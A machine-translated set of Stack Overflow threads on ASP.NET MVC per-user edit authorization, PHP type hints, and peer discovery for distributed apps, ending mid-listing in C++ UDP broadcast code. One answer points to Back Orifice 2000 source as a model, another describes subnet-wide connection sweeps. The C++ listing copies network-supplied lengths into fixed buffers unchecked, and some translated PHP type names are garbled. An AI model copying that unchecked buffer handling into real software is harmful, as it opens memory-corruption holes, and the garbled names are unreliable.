那么就没有效果了。PersonID=1 可以进入并编辑他们自己的个人资料（他们应该可以这样做），但他们也可以将 URL 更改为[http://localhost/person/edit/2](http://localhost/person/edit/2)并且他们拥有编辑 PersonID=2 的完全权限profile 以及（他们不应该这样做）。

这是否意味着我必须创建自己的授权过滤器，在允许他们访问之前检查用户请求的操作是否“属于”他们？也就是说，如果当前登录的人正在请求参数= 1的编辑操作，我是否需要进行自定义检查以确保当前登录的人是PersonID = 1，如果是，授权他们，如果没有，拒绝访问？

感觉好像我在这里遗漏了一些明显的东西，所以任何指导都将不胜感激。

* * *

## 回答 #1

> 赞同：62
> 
> 时间：2008-12-24T07:03:51.867

也许您可以组织控制器操作，使 URL 更像[http://localhost/person/editme](http://localhost/person/editme)并显示当前登录用户的编辑表单。这样，用户就无法破解 URL 来编辑其他人。

* * *

## 回答 #2

> 赞同：36
> 
> 时间：2009-06-28T12:11:34.793

我的 $.02：

授权和认证是两个不同的东西。简单地说，问题是你能做这件事吗？你应该做吗？你可以挑你的朋友，你可以挑你的鼻子，但你不能挑你朋友的鼻子！如果每个角色都可以做到（用户有手和鼻子），则无需检查授权。有一个 Post 方法供用户访问他们自己的个人资料并使用表单的隐藏值或重定向测试个人资料 ID（不是你的鼻子，走开）。

有一个 Get 方法来编辑其他个人资料，只需在此处检查管理员角色 - （我是一名医生，我有权将事情放在你的鼻子上）......

* * *

## 回答 #3

> 赞同：16
> 
> 时间：2009-06-25T13:41:32.027

一个更优雅的解决方案是编写自己的授权操作过滤器，或者通过扩展 [Authorize]，或者实现 IAuthorizationFilter，如下所示：

```
public class AuthorizeOwnerAttribute: FilterAttribute, IAuthorizationFilter
{
    #region IAuthorizationFilter Members

    public void OnAuthorization(AuthorizationContext filterContext)
    {
        // add logic here that compares the currently logged in user, to the owner of the profile that is being edited
        // get currently logged in user info from filterContext.HttpContext.User.Identity;
        // get profile being edited from filterContext.RouteData or filterContext.Something
    }

    #endregion
} 
```

我不确定 OnAuthorization 方法的实际逻辑是什么，但我的评论应该为您提供一个起点。您必须通过 Google 了解更多信息 - 如何将用户重定向到不同的视图，或者是否抛出在其他地方处理的强类型异常（可能在 [HandleError] 属性中）。

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2008-12-24T07:25:29.797

马特是对的。

授权的目的是表明他们被允许执行该功能 - 您尝试做的是说明他们是否可以执行该特定 ID 的功能。

所以有两个解决方案：

1.  就像马特说的那样，做一个不带 ID 的动作，但从会话信息中查找当前登录的用户，并检索它们。
2.  执行一个需要 ID 的操作，但只允许管理员访问 - 这样他们就可以在需要时修改其他用户信息。

但要回答这个问题，授权只是说“是的，这个人可以使用修改用户操作”，而不是基于输入的参数。

另一种方法是，您可以让它检查用户是否检索了 == 当前用户，或者重定向到另一个动作，说他们不能编辑该用户 - 但最好只提供一个不采取id，并且只获取当前登录的用户。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2010-02-22T13:20:25.927

此问题的解决方案：http: [//nerddinnerbook.s3.amazonaws.com/Part9.htm](http://nerddinnerbook.s3.amazonaws.com/Part9.htm)

“在编辑晚餐时使用 User.Identity.Name 属性

现在让我们添加一些限制用户的授权逻辑，以便他们只能编辑他们自己主持的晚餐的属性……”

# php - 在 PHP 中声明变量类型？

> ID：390932
> 
> 赞同：54
> 
> 时间：2008-12-24T06:57:12.490
> 
> 标签：php, variable-types

[我试图让我的 Netbeans 使用 PHP 自动完成](https://stackoverflow.com/questions/390192)，我了解到这段代码在 PHP 中是有效的：

```
function blah(Bur $bur) {} 
```

几个问题：

1.  **这实际上对我可以传递给 blah 方法的变量类型有任何限制**吗？
2.  如果这只是为了帮助 IDE，那对我来说很好。**如果我不在函数中，如何在 PHP 中声明变量的类型？**

* * *

## 回答 #1

> 赞同：78
> 
> 时间：2008-12-24T19:36:28.680

这种类型提示仅适用于验证函数参数；您不能声明 PHP 变量必须始终是某种类型。这意味着在您的示例中，当调用“blah”时，$bur 必须是 Bur 类型，但可以将 $bur 重新分配给函数内部的非 Bur 值。

类型提示仅适用于类或接口名称；例如，您不能声明参数必须是整数。

PHP 的类型提示与 Java 不同的一个令人讨厌的方面是不允许使用 NULL 值。因此，如果您想要传递 NULL 而不是对象的选项，则必须删除类型提示并在函数顶部执行以下操作：

```
assert('$bur === NULL || $bur instanceof Bur'); 
```

**编辑：**最后一段自 PHP 5.1 起不适用；您现在可以使用 NULL 作为默认值，即使有类型提示。

**编辑：**您还可以安装[SPL 类型处理](http://php.net/manual/en/book.spl-types.php)扩展，它为您提供字符串、整数、浮点数、布尔值和枚举的包装器类型。

**编辑：**您还可以使用 PHP 5.1 起的“数组”，以及 PHP 5.4 起的“可调用”。

**编辑：**自 PHP 7.0 起，您还可以使用“string”、“int”、“float”和“bool”。

* * *

## 回答 #2

> 赞同：39
> 
> 时间：2008-12-24T07:04:35.530

1.  如果您传递一个不属于该类型的值，则为函数参数指定数据类型将导致 PHP 抛出一个可捕获的致命错误。但请注意，您只能为类指定类型，而不能为字符串或整数等原语指定类型。
2.  如果提供了 PHPDoc 样式注释，大多数 IDE 都可以推断出数据类型。例如

```
 /**
 * @var string
 */
public $variable = "Blah"; 
```

**2021 年更新：**从 PHP 7（此时已经有几年历史）开始，也可以为函数参数声明原始类型。可空性也可以用 ? 从 7.1 开始在类型前面。您现在也可以声明返回类型。所以现在这是有效的 PHP：

```
public function hasFoo(?int $numFoos) :bool { 
```

phpStorm（我目前首选的 IDE）很乐意使用所有这些类型来完成代码，所以我不需要像以前那样需要那么多的 phpDoc 注释来输入。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2008-12-24T07:03:15.613

它被称为类型提示，是 PHP 5 中添加的。如果您来自 Java 之类的语言，这可能不是您所期望的。如果您没有传入预期的类型，它确实会引发错误。但是，您不能键入提示原语（没有 int $bur）。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2008-12-24T14:46:39.343

#2 : (...) 如果我不在函数中，如何在 PHP 中声明变量的类型？

我最近听说PHP4 & 5 中的“ [settype()](http://www.php.net/manual/en/function.settype.php) ”和“ [gettype()](http://www.php.net/manual/en/function.gettype.php)
” 你可以随时轻松地强制变量类型

* * *

来自 PHP.net：

bool settype ( 混合 &$var , 字符串 $type )

参数

var : 被转换的变量。type ：类型的可能值是：

*   "boolean" (或者，从 PHP 4.2.0 开始，"bool")
*   “整数”（或者，自 PHP 4.2.0 起，“整数”）
*   "float" (只有 PHP 4.2.0 以后才有可能，对于旧版本使用不推荐使用的变体 "double")
*   “细绳”
*   “大批”
*   “目的”
*   "null" (PHP 4.2.0 起)

[ :D 第一次访问，第一次评论...]

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-12-24T07:10:22.103

> 这实际上对我可以传递给 blah 方法的变量类型有任何限制吗？

这称为[类型提示](http://ch2.php.net/language.oop5.typehinting)。根据我刚刚链接到的 PHP 文档，是的，它确实对参数类型施加了限制：“*未能满足类型提示会导致可捕获的致命错误。* ”

> 如果我不在函数中，如何在 PHP 中声明变量的类型？

阅读[类型杂耍](http://ca.php.net/language.types.type-juggling)。您不能在 PHP 中显式定义变量的类型，它的类型由使用它的上下文决定。

# networking - 如何通过网络在私人应用程序之间进行私人通信？

> ID：390944
> 
> 赞同：2
> 
> 时间：2008-12-24T07:06:39.193
> 
> 标签：networking, communication, private, security

它基本上是一个安装在多台 PC 上的应用程序，每个安装程序都维护它自己的数据库，当它们同时启动（连接到同一网络）时，它与其他的数据库同步。

我已经使用简单的套接字连接和自定义缓冲区对此进行了测试，但希望使应用程序之间的通信符合公认的标准，并且要安全/健壮，而不是尝试重新发明轮子。

执行此应用程序到应用程序通信的正常/标准方式是什么？我在哪里可以找到更多信息？

此外，有哪些技术可以/可以用来发布和查找网络上的其他应用程序？

* * *

编辑：（细化我的问题）

下面的 gimel 指向的 pub/sub 模型似乎符合我的需要。然而，它涵盖了很多领域，我真的不知道从这一切中拿走和使用什么。

一旦两个或多个应用程序相互发现，我似乎也需要建立 P2P 连接 - 我该怎么做？

如果有可用的示例/教程，请指出。实现我需要的东西的小型开源项目/模块也可以提供服务。

我选择的平台是 Linux，但基于 Windows 的示例也非常有用。

* * *

编辑[09-01-06]：

我目前正在研究以下选项：

1.  [多播](http://tldp.org/HOWTO/Multicast-HOWTO.html)（TLDP-Howto） - 这似乎可行，但我需要进一步研究它。
2.  使用免费的动态 DNS 服务器，虽然这看起来有点冒险......
3.  使用一些免费的电子邮件工具，例如 gmail/yahoo/...，并从那里发送/阅读邮件以查找其他应用程序的 IP（可以工作，但感觉很脏）
4.  有人建议使用 webservices，但我不知道它们是如何工作的，必须研究一下

我将不胜感激您对这些选项的意见，以及是否有任何示例。不幸的是，我没有选择使用中央服务器或网站（除非可以保证它是免费和永久的）。

[编辑 2009-02-19]

（希望我能接受两个/三个答案！我接受的一个是因为它提供了思路和可能性，而其他人则提供了固定但适用的解决方案。感谢所有回答的人，所有这些都有帮助。）

当我找到/实施我的解决方案时，我将更新这个问题，如果解决方案足够，我将为它创建一个 sourceforge 项目。（无论如何，在一个更大的项目中，这只是一个小问题。）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-24T07:25:46.067

请参阅[发布/订阅](http://en.wikipedia.org/wiki/Publish_subscribe)异步消息传递范例。

一个示例实现是[Apache ActiveMQ](http://activemq.apache.org/)：

> Apache ActiveMQ 速度快，支持许多跨语言客户端和协议，带有易于使用的企业集成模式和许多高级特性，同时完全支持 JMS 1.1 和 J2EE 1.4。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-16T22:57:11.150

唔，

这有点像一道数学题。两台计算机找到彼此后如何**建立连接的问题相当简单。**您可以使用任意数量的 P2P 或客户端-服务器协议。[SSL](http://www.apache-ssl.org/)几乎是普遍可用的，但您也可以提供[SSH](http://www.openssh.com/)、运行[Freenet](http://freenetproject.org/)或其他服务。一旦通过这些协议之一建立连接，用于**交换数据**的发布/订阅模型就可以正常工作。但是还有

计算机如何找到彼此的问题是事情变得棘手的地方。基本上分为三种情况：

1.  **您的所有计算机都将在您自己的局域网上。** 在这种情况下，任何联网的计算机都可以广播一条它在线的消息，并返回有关其他计算机在线的消息。请记住，任何广播/多播消息都必须发送到网络上的每台机器，因为它不知道它的目标是什么。您无法在 Internet 上执行此操作，因为您无法向网络上的每台机器发送消息。

2.  **您的计算机位于互联网上的任意节点上***并且***总会有至少一台计算机连接到网络***并且***所有机器都会定期上线。** 在这种情况下，每台机器都可以保存一个运行中的 IP 地址列表。当离线一段时间的机器重新上线时，它会检查已知地址，连接到第一个有效地址——这就是 emule 协议查找服务器的方式。

3.  **您的计算机位于 Internet 上的任意节点上 ***并且*** 所有计算机一起离线 ***或***相当多的计算机长时间离线，而其他计算机则切换 IP 地址。** 在这里，我认为您无法证明没有新机器就无法找到*彼此*一些中央服务器链接到公共 IP。没有办法在整个 Internet 上广播消息，因为它很大。在这些情况下，计算机无法识别其他联机计算机的信息，因此您需要使用一个中央公共资源：您提到的电子邮件地址、网站、ftp 服务器、IRC 频道。动态 DNS 只是集中式信息存储的又一个实例。如果您必须使用这样的商店，您自然必须评估所有可用商店的可靠性、速度和持久性。除非您提供有关您的应用程序在这方面需要什么的更多信息，否则我认为其他人无法决定您需要哪个永久存储。

我认为这涵盖了所有可能性。您需要做的是确定您的应用程序属于这些一般情况中的哪些，然后确定适合这种情况的协议之一。

## 编辑：

从反馈来看，情况 3 似乎适用。从上面的推理可以看出，没有办法避免某种形式的外部服务器 - 大海捞针的唯一方法是跟踪它的位置。在这样的提供者中，人们想要的品质是：

*   可靠性：某天发生的事情的频率
*   速度：事物响应的速度
*   持久性：你预计这件事会持续多久？随着互联网的发展，您会失去对它的访问权限吗？

如前所述，有许多容易获得的资源或多或少符合这个要求。电子邮件服务器（如您目前使用的）、网络服务器、FTP 服务器、DNS 服务器、IRC 频道、Twitter 帐户、网络论坛......

应用程序在一段时间后出现并且需要在没有中央服务器的情况下进行更新的问题是一个常见问题，但它主要在病毒编写者中常见 - 几乎任何有资源创建分布式应用程序的组织也有资源来维护中央服务器服务器。也就是说，多年来的标准解决方案包括电子邮件、http 服务器、ftp 服务器、IRC 通道和动态 DNS 服务器。这些类别中的不同服务器的速度、可靠性和持久性各不相同，因此选择一个的任务可以追溯到您的判断。IRC 频道值得一提，因为它们快速且易于设置，但随着互联网的发展，这些频道确实可能会逐渐消失。

作为使用各种“客户端查找”技术的分发应用程序示例，您可以[将源下载到 BO2K](http://www.bo2k.com/software/bo2k11.html)，一个，呃“远程管理实用程序”。这可能会让您深入了解远程更新客户端的所有功能。

只是为了重复。我想您的问题分为三个部分：

1.  机器相互发现（见上文）
2.  建立连接的机器（同样，SSL、SSH 和其他很容易获得）
3.  机器交换数据。您可以使用“发布/订阅”模型，或者只是推出您自己的简单[协议](http://en.wikipedia.org/wiki/Communications_protocol)。我为有自动更新客户端的公司工作，这就是我们所做的。创建自己的协议的原因是 1) 即使在最简单的情况下，对速度和可靠性的要求也会有所不同，交换的数据也会有所不同，2\. 最简单的数据交换只需要几行代码，因此没有人费心用于真正简单数据交换的协议， 3\. 由于不同的应用程序使用不同的方法和语言，因此没有用于简单数据交换的协议占主导地位。对于更复杂的情况，确实存在一整套协议，但它们的复杂性使它们难以用于简单的数据交换。[git scm](http://git-scm.com/)的方式发送数据是更新协议的一个例子。如果您的数据库恰好与 git 发送的源代码相似，您可以使用 git 来维护您的数据库。但是你的更新方法很可能不会像 git 那样做。另一个示例协议是一个或另一个版本的[Web 服务](http://en.wikipedia.org/wiki/Web_service)，例如 SOAP。这些协议只是*包装*使用 xml 和 http 在一台机器上调用函数的过程。如果您已经可以在应用程序之间建立套接字通信，那么没有理由这样做。请记住，要实现 Web 服务，您需要运行一个 http 服务器并将 http 客户端的 xml 解析为原始数据。考虑到您可以直接通过套接字发送数据，没有理由这样做。所以你又回到了自己的滚动。

无论如何，一个简单协议的示例可能是：

*   一个应用程序首先将它所拥有的数据的索引作为索引数组发送。
*   另一个应用程序发送一个新项目列表
*   然后第一个应用程序发送这些实际项目。

然后应用程序改变角色并以另一种方式交换数据。协议中给定的“握手”在伪代码中如下所示：

```
void update_database(in_stream, out_stream) {
  Get_Index_Of_Other_Machines_Items(in_stream);
  Send_Index_Of_Items_You_Need(out_stream);
  Get_Items_You_Need(in_stream);
} 
```

用另一个函数来实现这些数据交换的对面。

进一步的考虑是，如果数据库中的每个条目都是独立生成的，您将需要生成一个唯一的 ID，而不能引用分布式数据库中的所有项目。为此，您可以生成一个[GUID](http://en.wikipedia.org/wiki/Globally_Unique_Identifier)或一个大的随机数。

如果你要使用它，你无疑必须进一步调整和开发它。

但是请记住，*如果您的应用程序都只是偶尔更新*，则无法确定任何给定实例都会有任何数据项。例如，假设一天中有一半的机器在下午 5:00*之后*才上线，另一半在下午 5:00*之前才上线。*在这种情况下，如果两组机器直接相互更新，它们将不会共享任何数据。另一方面，如果您的机器确实在均匀分布的时间运行（而不是按照我描述的模式），那么每台机器很可能最终将获得所有更新（至少所有旧更新） .

鉴于这一切，我认为您应该准确考虑*您*的应用程序连接的频率以及所有数据完全同步的重要性。在极不频繁的情况下，您可能需要使用外部服务器来移动数据以及查找客户。**常规电子邮件**是解决此问题的自然方法。如果没有计算机在线而另一台计算机在线，那将是一回事。如果您担心访问特定的电子邮件帐户，您可以使用包含多个电子邮件地址的列表启动每个应用程序，检查所有地址，并且您可以选择使用更多地址更新应用程序，因为给定地址失败。将电子邮件用于所有事情将具有简单的优点。你可以使用

顺便说一句，[数字电台](http://en.wikipedia.org/wiki/Numbers_station)是互联网前解决信息更新问题的努力，但它们也不适合您的情况（但是它们确实向世界大部分地区广播）。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-02-12T20:08:18.763

我设计了一个与您几年前描述的类似的应用程序。我设计了一个在每个桌面上运行的“广告服务器”，并使用 UDP 将其状态广播到网络上运行的任何其他程序。现在，这有它自己的一系列问题，具体取决于您计划如何运行这个应用程序......但是，这是它工作方式的快速和肮脏......

我在一个端口上设置了一个“侦听器”，该端口是通过对数据库服务器和应用程序连接的数据库进行哈希处理来挑选的。这将确保我收到广播的任何人都使用与我相同的数据库，并允许应用程序的多个实例在桌面上运行（设计要求）。

然后，我设置了各种“BroadcastMessage()”函数来广播某些事件。我什至允许使用我的 API 的开发人员使用自定义有效负载数据创建自定义事件，然后让程序为该事件注册一个侦听器，当该事件进入时通知注册器并传递它随之而来的数据。

例如，当应用程序启动时，它会广播一条“我在这里”的消息，任何收听的人都可以吃掉这条消息，忽略它或回复它。在“我在这里”中，它包含正在运行的应用程序的 IP 地址，因此任何客户端都可以通过 TCP 连接连接到它以进行进一步的数据更新，这些数据必须被传递。

我选择了 UDP，因为所有其他正在运行的实例都不需要看到这些广播。这比什么都方便...如果有人在您在同一个屏幕上时向数据库添加了一条记录，那么新记录就会“出现”在您的桌面上。

如果管理员在运行应用程序时更改了用户的权限，用户不必退出并重新进入应用程序，更新就会被接收并在此处处理，用户可以这样做也很方便。他们需要什么。

在只侦听这些类型的消息的线程上设置侦听器真的很容易...如果您需要示例代码，我也可以提供，但它是用 C++ 编写的，专为 Windows 设计，但它使用原始 wsock32 .lib，所以它应该很容易转移到任何 Unix 平台。（只需要 typedef DWORD，因为我经常使用它..）。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-02-17T20:24:16.267

我在网络管理中已经解决了几次这个问题。您的基本关注似乎是“发现”，您的应用程序如何相互发现。

老实说，最简单的方法是知道你的 IP 地址和掩码（大多数是 c 类），并尝试连接到 c 类中的每台机器。

如果您默认为 C 类，这意味着它几乎总是适用于大多数网络。然后，您可以在添加要连接的特定 IP 地址或其他子网的位置允许覆盖。

要发现 C 类，您只需找出您的 IP 地址（比如 192.168.2.77），然后遍历 192.168.2.(1-254) 中的所有内容，尝试打开到每个地址的连接。

我已经用多个线程完成了（你可以用这种方式一次 ping 所有设备并在 3 秒内获得良好的结果。我在 5 分钟内发现了一个 B 类网络，有几百个线程！），或者你可以去在一个线程中从一个线程到下一个线程——但如果你这样做，请确保你的超时非常低（大约 1/2 秒左右），否则它将花费很长时间——即使是 1/2 秒也需要一分钟进行巡回演出。

您可能还希望让发现线程以较低的速度在后台运行，始终寻找新的伙伴。

并缓存您的“已知良好”IP 地址以加快启动速度。

这不是一个难题，但也不是微不足道的。只是期望做一些跑腿工作。

此外，您可能希望能够添加新的 IP/掩码来扫描外部子网。如果您想联系互联网上的设备，就没有办法解决这个问题（尽管一旦一台 PC 发现了一个网络，如果您愿意，它可以将地址发送给所有其他人，而且这可能会很快变得非常大！）

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-12-24T07:45:00.223

您希望这完全是 P2P 还是您打算拥有一个中央服务器来做更多的事情而不是作为一个目录？

为了通信安全，SSL 应该没问题。Java 以一种非常简单的方式支持这些，如果你正在使用它的话。这是Java 6 中 SSL的[参考](http://java.sun.com/javase/6/docs/technotes/guides/security/jsse/JSSERefGuide.html)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-02-17T19:03:51.390

行。正如所承诺的，这是我从我的应用程序中提取的一些示例代码。这预计不会编译和运行，这是我如何做到的一个*例子*。你可能不得不做你完全不同的事情。另外，这是为 Windows 编写的，正如您将在代码中看到的那样，它使用 Windows 消息在服务器线程和主应用程序之间发送数据，但这完全取决于您计划如何使用它。我留下了一些更有趣的部分供您参考。

至于安全部分，我想你可以处理那部分。这只是在数据通过网络之前加密数据的简单问题，使用一些众所周知的密码，所以我认为我不必包含任何内容。例如，您可以看到我是如何构建数据包头的，然后是一个通常由另一个结构组成的有效负载。因此，加密该结构，将其作为数据发送，然后在另一端解密，并将其复制到正确的结构中。

```
// Some defines that you may see in the code, all of which are user defined...
#define ADVERTISE_SERVER           0x12345678 // Some unique ID for your advertisement server
#define ACTIVITY_NONE              0x00000000
#define ACTIVITY_LOGON             0x00000001
#define ACTIVITY_LOGOFF            0x00000002
#define ACTIVITY_RUNNING           0x00000004
#define ACTIVITY_IDLE              0x00000005
#define ACTIVITY_SPECIFIC          0x00000006

enum Advertisements {
   ADVERTISE_SHUTDOWN,
   ADVERTISE_MESSAGE,
   ADVERTISE_DEBUG,
   ADVERTISE_OVERLAPPED,
   ADVERTISE_BROADCAST_IDENTITY,
   ADVERTISE_IDENTITY,
   ADVERTISE_PARAMETER_CHANGE
};

struct TAdvertiseServerPacket {
   UINT     uiAdvertisePacketType;
   DWORD    dwPacketLength;
   bool     bRequestReply;
   UINT     uiReplyType;
   bool     bOverlappedResult;
   int      iPacketId;
   bool     bBroadcast;
   char     GuidHash[35];
   BYTE     PacketData[1024];
};

struct TAdvertiseIdentity {
   TCHAR ComputerName[MAX_COMPUTERNAME_LENGTH + 1];
   char  szUserName[LEN_APPL_USERNAME + 1];
   char  szDatabase[MAX_PATH];
   char  szConfiguration[MAX_PATH];
   char  szVersion[16];
   long  nUserId;
   char  szApplication[MAX_PATH];
   char  szActivity[33];
   UINT  uiStartupIndc;
};

struct TAdvertiseMessage {
   char              MessageFrom[LEN_APPL_USERNAME + 1];
   char              MessageText[512];
};

struct TAdvertiseItemUpdate {
   NMHDR             pNMHDR;
   long              nItemId;
   long              nItemTypeId;
   char              szItemName[LEN_ITEM_NAME + 1];
   bool              bState;
};

struct TAdvertiseItemUpdateEx {
   NMHDR             pNMHDR;
   long              nItemId;
   bool              bState;
   bool              bBroadcast;
   DWORD             dwDataSize;
   void              *lpBuffer;
};

struct TOverlappedAdvertisement {
   int               iPacketId;
   BYTE              Data[1020];
};

DWORD WINAPI CAdvertiseServer::Go(void* tptr)
{
   CAdvertiseServer *pThis = (CAdvertiseServer*)tptr;

   /* Used and reused for Overlapped results, */
   DWORD BufferSize       = 0;
   BYTE *OverlappedBuffer = NULL;
   bool bOverlapped       = false;
   int  iOverlappedId     = 0;
   DWORD BufferPosition   = 0;
   DWORD BytesRecieved    = 0;
   TAdvertiseItemUpdateEx *itemex = NULL;
   UINT uiPacketNumber    = 0;

   bool Debug = false;
#ifdef _DEBUG
   Debug = true;
#endif
   {
      DWORD dwDebug = 0;
      dwDebug = GetParameter(ADVERTISE_SERVER_DEBUG); // GetParameter is part of the main program used to store running config values.
      if(dwDebug > 0)
      {
         Debug = true;
      }
   }
   WSAData wsaData;
   WSAStartup(MAKEWORD(1,1), &wsaData);
   ServerSocket = socket(PF_INET, SOCK_DGRAM, 0);
   if(ServerSocket == INVALID_SOCKET)
   {
      CLogging Log("Client.log");
      ServerSocket = NULL;
      Log.Log("Could not create server advertisement socket: %d", GetLastError());
      return -1;
   }
   sockaddr_in sin;
   ZeroMemory(&sin, sizeof(sin));
   sin.sin_family = AF_INET;
   sin.sin_port = htons(Port);
   sin.sin_addr.s_addr = INADDR_ANY;
   if(bind(ServerSocket, (sockaddr *)&sin, sizeof(sin)) != 0)
   {
      CLogging Log("Client.log");
      Log.Log("Could not bind server advertisement socket on port: %d Error: %d", Port, GetLastError());
      DWORD dwPort = 0;
      dwPort = GetParameter(ADVERTISE_SERVER_PORT); // Again, used to set the port number, if one could not be figured out.
      if(dwPort > 0)
      {
         return -1;
      }
      Port = 36221;
      sin.sin_port = htons(Port);
      if(bind(ServerSocket, (sockaddr *)&sin, sizeof(sin)) != 0)
      {
         CLogging Log("Client.log");
         Log.Log("Could not bind server advertisement socket on port: %d Error: %d Could not start AdvertiseServer after two attempts.  Server failed.", Port, GetLastError());
         return -1;
      }
   }

   SECURITY_ATTRIBUTES sa;
   sa.bInheritHandle = TRUE;
   sa.lpSecurityDescriptor = NULL;
   sa.nLength = sizeof(SECURITY_ATTRIBUTES);
   HANDLE mutex = CreateMutex(NULL, FALSE, "Client.Mutex"); // Used to keep and eye on the main program, if it shuts down, or dies, we need to die.
   while (1)
   {
      TAdvertiseServerPacket ap;
      sockaddr_in sin;
      int fromlen = sizeof(sin);
      fd_set fds;
      FD_ZERO(&fds);
      FD_SET(ServerSocket, &fds);
      timeval tv;
      tv.tv_sec = 15;
      tv.tv_usec = 0;
      int err = select(0, &fds, NULL, NULL, &tv);
      if(err == SOCKET_ERROR)
      {
         CLogging Log("Client.log");
         Log.Log("Advertise: Winsock error: %d", WSAGetLastError());
         Beep(800, 100);
         break;
      }
      if(err == 0)
      {
         if(WaitForSingleObject(mutex, 0) != WAIT_OBJECT_0)
         {
            continue; // Main app is still running
         }
         else
         {
            Beep(800, 100); // Main app has died, so exit our listen thread.
            break;
         }
      }

      int r = recvfrom(ServerSocket, (char *)&ap, sizeof(ap), 0, (sockaddr *)&sin, &fromlen);

      if(r != sizeof(TAdvertiseServerPacket))
      {
         continue;
      }
      switch(ap.uiAdvertisePacketType)
      {
         // This is where you respond to all your various broadcasts, etc.
         case ADVERTISE_BROADCAST_IDENTITY:
         {
            // None of this code is important, however you do it, is up to you.
            CDataAccess db(CDataAccess::DA_NONE);
            TCHAR ComputerName[MAX_COMPUTERNAME_LENGTH + 1];
            ZeroMemory(ComputerName, sizeof(ComputerName));
            DWORD len = MAX_COMPUTERNAME_LENGTH;
            GetComputerName(ComputerName, &len);
            if(pThis->szActivity) {
               CAdvertiseServer::AdvertiseIdentity(ComputerName, CDataAccess::GetLoggedInUserName(), CDataAccess::DatabaseConfiguration(), CDataAccess::DatabaseConfiguration(), ACTIVITY_SPECIFIC, pThis->szActivity, false);
            } else {
               CAdvertiseServer::AdvertiseIdentity(ComputerName, CDataAccess::GetLoggedInUserName(), CDataAccess::DatabaseConfiguration(), CDataAccess::DatabaseConfiguration(), ACTIVITY_RUNNING, NULL, false);
            }
         }
         case ADVERTISE_IDENTITY:
         {
            TAdvertiseIdentity ident;
            memcpy((void*)&ident, (void*)ap.PacketData, ap.dwPacketLength);
            Listener::iterator theIterator;
            theIterator = pThis->m_Listeners.find(ap.uiAdvertisePacketType);
            if(theIterator == pThis->m_Listeners.end())
            {

               //We got an Identity Broadcast, but we're not listening for them.
               continue;
            }
            {
               itemex = new TAdvertiseItemUpdateEx;
               ZeroMemory(itemex, sizeof(TAdvertiseItemUpdateEx));
               memcpy((void*)&ident, ap.PacketData, ap.dwPacketLength);
               itemex->pNMHDR.code     = (*theIterator).first;
               itemex->pNMHDR.hwndFrom = (*theIterator).second;
               itemex->pNMHDR.idFrom   = ADVERTISE_SERVER;
               itemex->dwDataSize      = sizeof(TAdvertiseIdentity);
               itemex->lpBuffer        = (void*)&ident;
               SendMessage((*theIterator).second, WM_NOTIFY, 0, (LPARAM)itemex);
               delete itemex;
            }
         }
         case ADVERTISE_SHUTDOWN:
         {
            TCHAR ComputerName[MAX_COMPUTERNAME_LENGTH + 1];
            ZeroMemory(ComputerName, sizeof(ComputerName));
            DWORD len = MAX_COMPUTERNAME_LENGTH;
            GetComputerName(ComputerName, &len);
            CString guid;
            guid.Format("%s%s", CDataAccess::DatabaseConfiguration(), ComputerName);
            if(stricmp(ap.GuidHash, CDataAccess::HashPassword(guid)) == 0)
            {
               return 1;
            }
         }
         case ADVERTISE_MESSAGE:
         {
            TAdvertiseMessage msg;
            memcpy((void*)&msg, (void*)ap.PacketData, ap.dwPacketLength);
            CString msgtext;
            msgtext.Format("Message from: %s\r\n\r\n%s", msg.MessageFrom, msg.MessageText);
            ::MessageBox(NULL, msgtext, "Broadcast Message", MB_ICONINFORMATION | MB_SYSTEMMODAL);
            break;
         }
         case ADVERTISE_OVERLAPPED:
         {
            // I left this code in here, as it's a good example of how you can send large amounts of data over a UDP socket, should you need to do it.
            BufferPosition = (1020 * ((ap.uiReplyType - 1) - 1));
            if(BufferPosition > BufferSize) {
               BufferPosition -= 1020;
            }
            TOverlappedAdvertisement item;
            ZeroMemory(&item, sizeof(TOverlappedAdvertisement));
            memcpy((void*)&item, (void*)ap.PacketData, ap.dwPacketLength);
            if(item.iPacketId == iOverlappedId)
            {
               DWORD ToCopy = (sizeof(item.Data) > (BufferSize - BytesRecieved) ? BufferSize - BytesRecieved : sizeof(item.Data));
               memcpy((void*)&OverlappedBuffer[BufferPosition], (void*)item.Data, ToCopy);
               BytesRecieved += ToCopy;
               if(BytesRecieved < BufferSize)
               {
                  continue;
               }
            }
         }
         default:
         {
            // What do we do if we get an advertisement we don't know about?
            Listener::iterator theIterator;
            if(bOverlapped == false)
            {
               theIterator = pThis->m_Listeners.find(ap.uiAdvertisePacketType);
               if(theIterator == pThis->m_Listeners.end())
               {
                  continue;
               }
            }

            // Or it could be a data packet
            TCHAR ComputerName[MAX_COMPUTERNAME_LENGTH + 1];
            ZeroMemory(ComputerName, sizeof(ComputerName));
            DWORD len = MAX_COMPUTERNAME_LENGTH;
            GetComputerName(ComputerName, &len);
            CString guid;
            guid.Format("%s%s", CDataAccess::DatabaseConfiguration(), ComputerName);
            bool FromUs = stricmp(ap.GuidHash, CDataAccess::HashPassword(guid)) == 0;
            if(((FromUs && Debug) || !FromUs) || ap.bBroadcast)
            {
               if(ap.bOverlappedResult)
               {
                  if(ap.uiReplyType == 1)
                  {
                     itemex = new TAdvertiseItemUpdateEx;
                     ZeroMemory(itemex, sizeof(TAdvertiseItemUpdateEx));
                     memcpy(itemex, ap.PacketData, ap.dwPacketLength);
                     OverlappedBuffer = (BYTE*)malloc(itemex->dwDataSize);
                     BufferSize = itemex->dwDataSize;
                     ZeroMemory(OverlappedBuffer, itemex->dwDataSize);
                     bOverlapped = true;
                     iOverlappedId = ap.iPacketId;
                     uiPacketNumber = ap.uiReplyType;
                  }
                  continue;
               }
               if(bOverlapped)
               {
                  itemex->pNMHDR.code     = (*theIterator).first;
                  itemex->pNMHDR.hwndFrom = (*theIterator).second;
                  itemex->pNMHDR.idFrom   = ADVERTISE_SERVER;
                  itemex->dwDataSize      = BufferSize;
                  itemex->lpBuffer        = (void*)OverlappedBuffer;
                  SendMessage((*theIterator).second, WM_NOTIFY, 0, (LPARAM)itemex);
                  delete itemex;
